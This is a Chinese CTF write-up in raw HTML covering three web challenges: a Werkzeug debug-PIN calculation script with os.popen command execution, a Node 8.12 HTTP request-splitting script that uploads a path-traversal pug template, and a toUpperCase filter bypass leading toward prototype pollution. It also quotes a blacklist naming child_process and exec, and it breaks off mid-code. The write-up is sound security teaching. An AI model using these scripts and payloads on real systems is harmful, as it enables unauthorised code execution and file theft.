mac地址十进制  02:42:ae:00:cf:18-&gt;2485410385688</span></span><br><span class=\"line\"></span><br><span class=\"line\">get_machine_id() <span class=\"comment\"># /etc/machine-id   这里是/proc/self/cgroup  </span></span><br><span class=\"line\"><span class=\"number\">12</span>:blkio:/docker/<span class=\"number\">29747</span>fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76</span><br></pre></td></tr></table></figure>\n\n<p>计算脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> chain</span><br><span class=\"line\">probably_public_bits = [</span><br><span class=\"line\">    <span class=\"string\">'flaskweb'</span>,<span class=\"comment\"># username</span></span><br><span class=\"line\">    <span class=\"string\">'flask.app'</span>,<span class=\"comment\"># modname</span></span><br><span class=\"line\">    <span class=\"string\">'Flask'</span>,<span class=\"comment\"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class=\"line\">    <span class=\"string\">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class=\"comment\"># getattr(mod, '__file__', None),</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">private_bits = [</span><br><span class=\"line\">    <span class=\"string\">'2485410385688'</span>,<span class=\"comment\"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class=\"line\">    <span class=\"string\">'29747fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76'</span><span class=\"comment\"># get_machine_id(), /etc/machine-id</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">h = hashlib.md5()</span><br><span class=\"line\"><span class=\"keyword\">for</span> bit <span class=\"keyword\">in</span> chain(probably_public_bits, private_bits):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> bit:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> isinstance(bit, str):</span><br><span class=\"line\">        bit = bit.encode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">    h.update(bit)</span><br><span class=\"line\">h.update(<span class=\"string\">b'cookiesalt'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">cookie_name = <span class=\"string\">'__wzd'</span> + h.hexdigest()[:<span class=\"number\">20</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">num = <span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> num <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">    h.update(<span class=\"string\">b'pinsalt'</span>)</span><br><span class=\"line\">    num = (<span class=\"string\">'%09d'</span> % int(h.hexdigest(), <span class=\"number\">16</span>))[:<span class=\"number\">9</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">rv =<span class=\"literal\">None</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> rv <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> group_size <span class=\"keyword\">in</span> <span class=\"number\">5</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> len(num) % group_size == <span class=\"number\">0</span>:</span><br><span class=\"line\">            rv = <span class=\"string\">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class=\"string\">'0'</span>)</span><br><span class=\"line\">                          <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(num), group_size))</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        rv = num</span><br><span class=\"line\"></span><br><span class=\"line\">print(rv)</span><br></pre></td></tr></table></figure>\n\n<p>拿到pin登录</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[console ready]&gt;&gt;&gt; <span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>os.popen(<span class=\"string\">\"ls /\"</span>).read()</span><br><span class=\"line\"><span class=\"string\">'app\\nbin\\nboot\\ndev\\netc\\nhome\\nlib\\nlib64\\nmedia\\nmnt\\nopt\\nproc\\nroot\\nrun\\nsbin\\nsrv\\nsys\\nthis_is_the_flag.txt\\ntmp\\nusr\\nvar\\n'</span>  </span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>os.popen(<span class=\"string\">\"cat /this_is_the_flag.txt\"</span>).read()</span><br><span class=\"line\"><span class=\"string\">'flag&#123;033e49d3-6201-41c6-9725-e95898cbc3d9&#125;\\n'</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"node-game\"><a href=\"#node-game\" class=\"headerlink\" title=\"node_game\"></a>node_game</h1><p>经过查找资料，本题是改自于hackim-2020，<a href=\"http://blog.5am3.com/2020/02/11/ctf-node1/\" target=\"_blank\" rel=\"noopener\">出题师傅博客</a></p>\n<p><strong>题目提示 node 版本为8.12.0</strong></p>\n<p>打开题目有两个选项</p>\n<p><img src=\"/pic/117.png\" alt=\"\"></p>\n<p>选择Only admin can use this</p>\n<p>是一个文件上传的界面</p>\n<p><img src=\"/pic/116.png\" alt=\"\"></p>\n<p>选择Click here to get the source可以查看源码，总共有四条路由和一个黑名单函数</p>\n<p>黑名单函数检测下列字符</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;global&quot;,&quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;</span><br></pre></td></tr></table></figure>\n\n<p>根路由是获取pug文件渲染后的页面</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.get(<span class=\"string\">'/'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> action = req.query.action?req.query.action:<span class=\"string\">\"index\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>( action.includes(<span class=\"string\">\"/\"</span>) || action.includes(<span class=\"string\">\"\\\\\"</span>) )&#123;   <span class=\"comment\">//action不能包含 ‘/’和‘\\\\’</span></span><br><span class=\"line\">        res.send(<span class=\"string\">\"Errrrr, You have been Blocked\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    file = path.join(__dirname + <span class=\"string\">'/template/'</span>+ action +<span class=\"string\">'.pug'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> html = pug.renderFile(file);</span><br><span class=\"line\">    res.send(html);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>一条是显示源码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.get(<span class=\"string\">'/source'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">    res.sendFile(path.join(__dirname + <span class=\"string\">'/template/source.txt'</span>));</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>一条是上传文件</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.post(<span class=\"string\">'/file_upload'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> ip = req.connection.remoteAddress;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">        msg: <span class=\"string\">''</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!ip.includes(<span class=\"string\">'127.0.0.1'</span>)) &#123;   <span class=\"comment\">//保证地址是127.0.0.1</span></span><br><span class=\"line\">        obj.msg=<span class=\"string\">\"only admin's ip can use it\"</span></span><br><span class=\"line\">        res.send(<span class=\"built_in\">JSON</span>.stringify(obj));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fs.readFile(req.files[<span class=\"number\">0</span>].path, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">err, data</span>)</span>&#123;   <span class=\"comment\">//读取文件内容，读取的数据放到data中</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(err)&#123;</span><br><span class=\"line\">            obj.msg = <span class=\"string\">'upload failed'</span>;  </span><br><span class=\"line\">            res.send(<span class=\"built_in\">JSON</span>.stringify(obj));   <span class=\"comment\">//如果读取失败，返回upload failed</span></span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> file_path = <span class=\"string\">'/uploads/'</span> + req.files[<span class=\"number\">0</span>].mimetype +<span class=\"string\">\"/\"</span>;   <span class=\"comment\">//file_path为 /uploads/ 加上上传时的Content-Type</span></span><br><span class=\"line\">            <span class=\"keyword\">var</span> file_name = req.files[<span class=\"number\">0</span>].originalname   <span class=\"comment\">//file_name为上传时的文件名</span></span><br><span class=\"line\">            <span class=\"keyword\">var</span> dir_file = __dirname + file_path + file_name</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!fs.existsSync(__dirname + file_path))&#123;  </span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    fs.mkdirSync(__dirname + file_path)  <span class=\"comment\">//检查路径是否存在，如果不存在就创建 </span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">                    obj.msg = <span class=\"string\">\"file type error\"</span>;</span><br><span class=\"line\">                    res.send(<span class=\"built_in\">JSON</span>.stringify(obj));</span><br><span class=\"line\">                    <span class=\"keyword\">return</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                fs.writeFileSync(dir_file,data)  <span class=\"comment\">//向上传的文件中写入数据</span></span><br><span class=\"line\">                obj = &#123;</span><br><span class=\"line\">                    msg: <span class=\"string\">'upload success'</span>,</span><br><span class=\"line\">                    filename: file_path + file_name</span><br><span class=\"line\">                &#125; </span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">                obj.msg = <span class=\"string\">'upload failed'</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            res.send(<span class=\"built_in\">JSON</span>.stringify(obj));    </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>还有一条是代理访问<code>http://localhost:8081/source</code><br>这一条就刚好解决了文件上传的IP不是127.0.0.1的问题。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app.get(<span class=\"string\">'/core'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> q = req.query.q;  <span class=\"comment\">//获取参数q</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> resp = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (q) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> url = <span class=\"string\">'http://localhost:8081/source?'</span> + q  </span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(url)  <span class=\"comment\">//终端打印url</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> trigger = blacklist(url);  </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (trigger === <span class=\"literal\">true</span>) &#123;   </span><br><span class=\"line\">            res.send(<span class=\"string\">\"&lt;p&gt;error occurs!&lt;/p&gt;\"</span>);   <span class=\"comment\">//url中不能包含黑名单中字符，也就是参数q不能包含</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                http.get(url, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">resp</span>) </span>&#123;</span><br><span class=\"line\">                    resp.setEncoding(<span class=\"string\">'utf8'</span>);</span><br><span class=\"line\">                    resp.on(<span class=\"string\">'error'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">err</span>) </span>&#123;  <span class=\"comment\">//处理response流中的error事件</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (err.code === <span class=\"string\">\"ECONNRESET\"</span>) &#123;</span><br><span class=\"line\">                     <span class=\"built_in\">console</span>.log(<span class=\"string\">\"Timeout occurs\"</span>);</span><br><span class=\"line\">                     <span class=\"keyword\">return</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                   &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">                    resp.on(<span class=\"string\">'data'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">chunk</span>) </span>&#123;   <span class=\"comment\">////处理response流中的data事件</span></span><br><span class=\"line\">                        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                         resps = chunk.toString();</span><br><span class=\"line\">                         res.send(resps);</span><br><span class=\"line\">                        &#125;<span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">                           res.send(e.message);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">                    &#125;).on(<span class=\"string\">'error'</span>, (e) =&gt; &#123;</span><br><span class=\"line\">                         res.send(e.message);&#125;);</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">console</span>.log(error);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        res.send(<span class=\"string\">\"search param 'q' missing!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p>题目提示了node版本，搜索发现  此版本的http.get存在漏洞<br><a href=\"https://xz.aliyun.com/t/2894#toc-2\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/2894#toc-2</a></p>\n<p>翻阅pug文档<a href=\"https://pugjs.bootcss.com/language/includes.html\" target=\"_blank\" rel=\"noopener\">https://pugjs.bootcss.com/language/includes.html</a></p>\n<p>包含flag文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">doctype html</span><br><span class=\"line\">html</span><br><span class=\"line\">  head</span><br><span class=\"line\">    style</span><br><span class=\"line\">      include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>\n\n<p>使用文件上传路由，然后抓包，再修改一下</p>\n<blockquote>\n<p>尝试自己编写脚本，但是一直报错，待更新</p>\n</blockquote>\n<p>附上赵师傅的脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">''' HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Host: x</span></span><br><span class=\"line\"><span class=\"string\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">POST /file_upload HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810</span></span><br><span class=\"line\"><span class=\"string\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"string\">cache-control: no-cache</span></span><br><span class=\"line\"><span class=\"string\">Host: x</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: 292</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">----------------------------919695033422425209299810</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=\"file\"; filename=\"glzjin.pug\"</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: /../template</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">doctype html</span></span><br><span class=\"line\"><span class=\"string\">html</span></span><br><span class=\"line\"><span class=\"string\">  head</span></span><br><span class=\"line\"><span class=\"string\">    style</span></span><br><span class=\"line\"><span class=\"string\">      include ../../../../../../../flag.txt</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">----------------------------919695033422425209299810--</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">GET /flag HTTP/1.1</span></span><br><span class=\"line\"><span class=\"string\">Host: x</span></span><br><span class=\"line\"><span class=\"string\">Connection: close</span></span><br><span class=\"line\"><span class=\"string\">x:'''</span></span><br><span class=\"line\">payload = payload.replace(<span class=\"string\">\"\\n\"</span>, <span class=\"string\">\"\\r\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">''</span>.join(chr(int(<span class=\"string\">'0xff'</span> + hex(ord(c))[<span class=\"number\">2</span>:].zfill(<span class=\"number\">2</span>), <span class=\"number\">16</span>)) <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> payload)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">r = requests.get(<span class=\"string\">'http://3bfb563e-08fd-4430-80c9-4619b1f703e9.node3.buuoj.cn/core?q='</span> + urllib.parse.quote(payload))</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br><span class=\"line\">r = requests.get(url+<span class=\"string\">'/?action=glzjin'</span>)</span><br><span class=\"line\">print(r.text)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n<h1 id=\"ezExpress\"><a href=\"#ezExpress\" class=\"headerlink\" title=\"ezExpress\"></a>ezExpress</h1><p>打开题目是一个登录界面</p>\n<p><img src=\"/pic/127.png\" alt=\"\"></p>\n<p>随意输入一下看看404有什么东西，得到了网页的绝对地址/app</p>\n<p><img src=\"/pic/130.png\" alt=\"\"></p>\n<p>扫描发现有源码<a href=\"http://www.zip,先查看route下的源码\" target=\"_blank\" rel=\"noopener\">www.zip,先查看route下的源码</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safeKeyword</span>(<span class=\"params\">keyword</span>) </span>&#123;   <span class=\"comment\">//不能包含admin</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(keyword.match(<span class=\"regexp\">/(admin)/i</span>s)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> keyword</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">undefined</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">router.post(<span class=\"string\">'/login'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(req.body.Submit==<span class=\"string\">\"register\"</span>)</span><br><span class=\"line\">   <span class=\"keyword\">if</span>(safeKeyword(req.body.userid))&#123;      <span class=\"comment\">//调用safeKeyword函数进行过滤</span></span><br><span class=\"line\">    res.end(<span class=\"string\">\"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;\"</span>) </span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">    req.session.user=&#123;   <span class=\"comment\">//将用户名，密码写入session</span></span><br><span class=\"line\">      <span class=\"string\">'user'</span>:req.body.userid.toUpperCase(),   <span class=\"comment\">//将输入转成大写</span></span><br><span class=\"line\">      <span class=\"string\">'passwd'</span>: req.body.pwd,</span><br><span class=\"line\">      <span class=\"string\">'isLogin'</span>:<span class=\"literal\">false</span></span><br><span class=\"line\">    &#125;&#123;</span><br><span class=\"line\">    res.redirect(<span class=\"string\">'/'</span>); </span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(req.body.Submit==<span class=\"string\">\"login\"</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!req.session.user)&#123;res.end(<span class=\"string\">\"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;\"</span>)&#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class=\"line\">      req.session.user.isLogin=<span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">      res.end(<span class=\"string\">\"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;\"</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>觉得<code>toUpperCase</code>有点可疑，<a href=\"https://xz.aliyun.com/t/7184#toc-11\" target=\"_blank\" rel=\"noopener\">查找资料</a>后发现</p>\n<p>对于toUpperCase():</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure>\n\n<p>对于toLowerCase():</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure>\n\n<p>使用adm<code>ı</code>n注册  </p>\n<p>merge、clone 可能触发原型链污染（暂时没有弄懂为什么会造成原型链污染）<a href=\"https://xz.aliyun.com/t/7184#toc-5\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/7184#toc-5</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">router.post(<span class=\"string\">'/action'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(req.session.user.user!=<span class=\"string\">\"ADMIN\"</span>)&#123;res.end(<span class=\"string\">\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\"</span>)&#125; </span><br><span class=\"line\">  req.session.user.data = clone(req.body);</span><br><span class=\"line\">  res.end(<span class=\"string\">\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\"</span>);  </span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">router.get(<span class=\"string\">'/info'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, 